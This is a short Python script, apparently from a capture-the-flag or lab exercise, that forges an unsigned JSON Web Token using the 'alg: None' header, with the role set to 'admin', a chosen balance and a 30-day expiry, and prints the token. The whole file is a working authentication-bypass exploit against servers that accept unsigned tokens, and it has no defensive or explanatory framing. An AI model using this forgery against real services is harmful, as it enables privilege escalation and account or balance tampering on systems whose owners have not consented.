import base64
import json
from datetime import datetime, timedelta, timezone

def b64url(data):

    return base64.urlsafe_b64encode(json.dumps(data).encode()).decode().rstrip("=")

def generate_jwt(user_id=321, username="NEMO1337", balance=1337, days_valid=30):

    header = {"alg": "None"}

    kyiv_tz = timezone(timedelta(hours=2))
    now = datetime.now(kyiv_tz)
    exp_time = now + timedelta(days=days_valid)
    
    exp = int(exp_time.timestamp())
    
    payload = {
        "user_id": user_id,
        "username": username,
        "balance": balance,
        "role": "admin",
        "exp": exp
    }
    
    token = f"{b64url(header)}.{b64url(payload)}."
    return token

if __name__ == "__main__":
    token = generate_jwt(balance=1337, days_valid=30)
    print("JWT:")
    print(token)
